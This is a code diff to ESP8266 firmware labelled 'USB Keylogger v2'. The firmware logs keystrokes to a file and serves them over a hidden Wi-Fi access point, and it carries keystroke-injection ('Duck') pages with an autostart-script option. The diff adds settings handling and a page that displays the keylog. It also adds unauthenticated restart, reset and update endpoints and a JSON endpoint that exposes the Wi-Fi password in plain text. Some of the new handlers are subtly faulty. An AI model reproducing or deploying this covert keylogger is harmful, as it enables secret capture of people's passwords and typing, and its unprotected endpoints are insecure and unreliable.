@@ -8,6 +8,7 @@
 #include <WiFiClient.h>
 #include <AsyncElegantOTA.h>
 
+#include "Settings.h"
 #include "data.h"
 
 
@@ -15,6 +16,9 @@
 #define bufferSize 600
 #define debug false
 
+Settings settings;
+
+bool shouldReboot = false;
 
 //Web stuff
 extern const uint8_t data_indexHTML[] PROGMEM;
@@ -29,6 +33,7 @@ extern const uint8_t data_skeletonCSS[] PROGMEM;
 extern const uint8_t data_license[] PROGMEM;
 extern const uint8_t data_settingsHTML[] PROGMEM;
 extern const uint8_t data_viewHTML[] PROGMEM;
+extern const uint8_t data_keylogHTML[] PROGMEM;
 
 extern String formatBytes(size_t bytes);
 
@@ -55,6 +60,7 @@ int lc = 0; //line buffer counter
 
 FSInfo fs_info;
 File f;
+
 
 void handleUpload(AsyncWebServerRequest *request, String filename, size_t index, uint8_t *data, size_t len, bool final){
   File f2;
@@ -85,6 +91,11 @@ void sendToIndex(AsyncWebServerRequest *request){
   request->send(response);
 }
 
+void sendSettings(AsyncWebServerRequest *request) {
+  AsyncWebServerResponse *response = request->beginResponse_P(200, "text/html", data_settingsHTML, sizeof(data_settingsHTML));
+  request->send(response);
+}
+
 void sendBuffer(){
   for(int i=0;i<bc;i++) Serial.write((char)scriptBuffer[i]);
   runLine = false;
@@ -106,23 +117,32 @@ void setup() {
 
   Serial.println("\n\n\nUSB Keylogger v2\n\n");
   
-  //Serial.println(WiFi.SSID());
-  WiFi.mode(WIFI_STA);
-  WiFi.softAP(ssid,password);
   
   EEPROM.begin(4096);
   SPIFFS.begin();
 
+  settings.load();
+  settings.print();
+
   //httpUpdater.setup(&server2, "/update", "admin", "admin");
+
+  //Serial.println(WiFi.SSID());
+  //WiFi.mode(WIFI_STA);
+  //WiFi.softAP(ssid,password);
+
+  WiFi.mode(WIFI_STA);
+  WiFi.softAP(settings.ssid, settings.password, settings.channel, settings.hidden);
   
   MDNS.addService("http","tcp",80);
 
   f = SPIFFS.open("/keystrokes.txt", "a+");
   if(!f) Serial.println("file open failed");
 
+  /*
   server.on("/", HTTP_GET, [](AsyncWebServerRequest *request){
     request->send(SPIFFS, "/keystrokes.txt", "text/plain");
   });
+  */
 
   server.on("/clear", HTTP_GET, [](AsyncWebServerRequest *request){
     f.close();
@@ -130,9 +150,19 @@ void setup() {
     request->send(200, "text/plain", "file cleared!");
   });
 
+  server.on("/", HTTP_GET, [](AsyncWebServerRequest *request) {
+    AsyncWebServerResponse *response = request->beginResponse_P(200, "text/html", data_keylogHTML, sizeof(data_keylogHTML));
+    request->send(response);
+  });
+
   // Duck shit
-  server.on("/duck", HTTP_GET, [](AsyncWebServerRequest *request) {
+  server.on("/index.html", HTTP_GET, [](AsyncWebServerRequest *request) {
     AsyncWebServerResponse *response = request->beginResponse_P(200, "text/html", data_indexHTML, sizeof(data_indexHTML));
+    request->send(response);
+  });
+
+  server.on("/license.txt", HTTP_GET, [](AsyncWebServerRequest *request) {
+    AsyncWebServerResponse *response = request->beginResponse_P(200, "text/plain", data_license, sizeof(data_license));
     request->send(response);
   });
 
@@ -146,7 +176,7 @@ void setup() {
     request->send(response);
   });
 
-  server.on("license", HTTP_GET, [](AsyncWebServerRequest *request) {
+  server.on("/license", HTTP_GET, [](AsyncWebServerRequest *request) {
     AsyncWebServerResponse *response = request->beginResponse_P(200, "text/plain", data_license, sizeof(data_license));
     request->send(response);
   });
@@ -174,6 +204,54 @@ void setup() {
   server.on("/info.html", HTTP_GET, [](AsyncWebServerRequest *request) {
     AsyncWebServerResponse *response = request->beginResponse_P(200, "text/html", data_infoHTML, sizeof(data_infoHTML));
     request->send(response);
+  });
+
+  server.on("/settings.html", HTTP_GET, [](AsyncWebServerRequest *request) {
+    sendSettings(request);
+  });
+
+  server.on("/settings.html", HTTP_POST, [](AsyncWebServerRequest *request) {
+
+    if(request->hasArg("ssid")) {
+      String _ssid = request->arg("ssid");
+      settings.ssidLen = _ssid.length();
+      _ssid.toCharArray(settings.ssid, 32);
+      if(debug) Serial.println("new SSID = '"+_ssid+"'");
+    }
+    if(request->hasArg("pswd")) {
+      String _pswd = request->arg("pswd");
+      settings.passwordLen = _pswd.length();
+      _pswd.toCharArray(settings.password, 32);
+      if(debug) Serial.println("new password = '" + _pswd + "'");
+    }
+    if(request->hasArg("autostart")) {
+      String _autostart = request->arg("autostart");
+      settings.autostartLen = _autostart.length();
+      _autostart.toCharArray(settings.autostart, 32);
+      if(debug) Serial.println("new autostart = '" + _autostart + "'");
+    }
+    if(request->hasArg("ch")) settings.channel = request->arg("ch").toInt();
+    if(request->hasArg("hidden")) settings.hidden = true;
+    else settings.hidden = false;
+    if(request->hasArg("autoExec")) settings.autoExec = true;
+    else settings.autoExec = false;
+    
+    settings.save();
+    if(debug) settings.print();
+
+    sendSettings(request);
+  });
+
+  server.on("/settings.json", HTTP_GET, [](AsyncWebServerRequest *request) {
+    String output = "{";
+    output += "\"ssid\":\"" + (String)settings.ssid + "\",";
+    output += "\"password\":\"" + (String)settings.password + "\",";
+    output += "\"channel\":" + String((int)settings.channel) + ",";
+    output += "\"hidden\":" + String((int)settings.hidden) + ",";
+    output += "\"autoExec\":" + String((int)settings.autoExec) + ",";
+    output += "\"autostart\":\"" + (String)settings.autostart + "\"";
+    output += "}";
+    request->send(200, "text/json", output);
   });
 
   server.on("/list.json", HTTP_GET, [](AsyncWebServerRequest *request) {
@@ -266,11 +344,30 @@ void setup() {
     send404(request);
   });
 
+  server.on("/update", HTTP_GET, [](AsyncWebServerRequest *request) {
+    AsyncWebServerResponse *response = request->beginResponse(302, "text/plain", "");
+    response->addHeader("Location", "/info.html");
+    request->send(response);
+  });
+
+  server.on("/restart", HTTP_GET, [](AsyncWebServerRequest *request) {
+    shouldReboot = true;
+  });
+
+  server.on("/reset", HTTP_GET, [](AsyncWebServerRequest *request) {
+    settings.reset();
+    request->send(200, "text/plain", "true");
+    sendToIndex(request);
+  });
+
+
   AsyncElegantOTA.begin(&server);
   server.begin();
 }
 
 void loop() {
+  if(shouldReboot) ESP.restart();
+  
   AsyncElegantOTA.loop();
   if(Serial.available()) {
     f.write(Serial.read());
